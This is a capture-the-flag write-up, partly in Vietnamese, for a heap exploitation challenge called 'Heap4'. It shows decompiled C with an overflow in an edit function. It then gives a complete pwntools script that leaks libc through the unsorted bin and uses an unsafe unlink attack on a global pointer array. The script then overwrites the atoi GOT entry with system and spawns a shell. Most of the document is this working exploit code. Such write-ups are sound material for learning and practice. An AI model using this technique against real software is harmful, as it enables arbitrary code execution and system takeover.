# Heap4

## Mitigation

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```

## source code

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  initState(argc, argv, envp);
  puts("Ez heap challange !");
  while ( 1 )
  {
    menu();
    switch ( readInt() )
    {
      case 1:
        createHeap();
        break;
      case 2:
        showHeap();
        break;
      case 3:
        editHeap();
        break;
      case 4:
        deleteHeap();
        break;
      case 5:
        exit(0);
      default:
        puts("no option");
        break;
    }
  }
}
```

```c
__int64 editHeap()
{
  int Int; // [rsp+8h] [rbp-28h]
  unsigned int v2; // [rsp+Ch] [rbp-24h]
  char s1[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Input index:");
  Int = readInt();
  if ( (unsigned int)Int >= 0xA )
    exit(0);
  if ( !*(&store + Int) )
    return 0LL;
  printf("Input newsize:");
  v2 = readInt();
  if ( storeSize[Int] < v2 )
    storeSize[Int] = v2;
  puts("Do you want to change data (y/n)?");
  readStr(s1, 10u);
  if ( !strcmp(s1, "y") )
  {
    printf("Input data:");
    readStr(*(&store + Int), storeSize[Int]);
  }
  puts("Done ");
  return 0LL;
}
```

## Vulnerability

Trong hàm edit khi thay đổi size, chương trình ko hề free sau đó malloc lại, nên có thể dẫn đến heap overflow. Chương trình sử dụng một mảng global để lưu địa chỉ các heap, cùng với đó `PIE` đã được disable nên ta có thể dùng unsafe unlink để giải bài này. 

* unlink macro

```c
FD = P->fd;    /* forward chunk */
BK = P->bk;    /* backward chunk */

FD->bk = BK;    /* update forward chunk's bk pointer */
BK->fd = FD;    /* updated backward chunk's fd pointer */
```

## Exploit

```python
p = start()
libc = ELF('./libc.2.23.so')

def create(idx,size,data):
    p.send(b'1')
    p.sendafter(b'Index:',str(idx).encode())
    p.sendafter(b'size:',str(size).encode())
    p.sendafter(b'Input data:',data)

def show(idx, data_before):
    p.send(b'2')
    p.sendafter(b'Index:',str(idx).encode())
    p.recvuntil(b'Data = ' + data_before)
    return p.recvline()

def edit(idx,newsize,data):
    p.send(b'3')
    p.sendafter(b'index:',str(idx).encode())
    p.sendafter(b'newsize:',str(newsize).encode())
    p.sendafter(b'(y/n)?\n',b'y')
    p.sendafter(b'data:',data)

def delete(idx):
    p.send(b'4')
    p.sendafter(b'index:',str(idx).encode())

store = 0x06020E0
# leak main_arena with unsorted bin
## ngăn chặn chunk consolidate
create(0,0x68,b'a')
create(1,400,b'a')
create(2,0x68,b'a')
delete(1)

edit(0,0x70,b'a'*0x70)  # fill các null byte để có thể in địa chỉ main arena ra được
main_arena = u64(show(0,b'a'*0x70).strip().ljust(8,b'\x00'))
libc.address = main_arena - 0x39bb78
log.info('libc.address: ' + hex(libc.address))
edit(0,0x70,b'a'*0x68 + p64(0x1a1))     # sau khi leak xong cần sửa lại size của chunk đằng sau để có thể free được
create(1,400,b'a')


# unsafe unlink attack
create(3,0x88,b'a')
create(4,0x88,b'a')
edit(3,0x90, p64(0) + p64(0) + p64(store + 3*8 -8*3) + p64(store + 3*8 -8*2) + b'a'*0x60 + p64(0x80) + p64(0x90))
delete(4)

# At this point we can use "store" to overwrite itself to point to an arbitrary location
edit(3,0x90, p64(0) + p64(0) + p64(0) + p64(elf.got['atoi']))

# modify atoi got to system
edit(3,0x90,p64(libc.symbols['system']))
p.send(b'/bin/sh\x00')

p.interactive()
```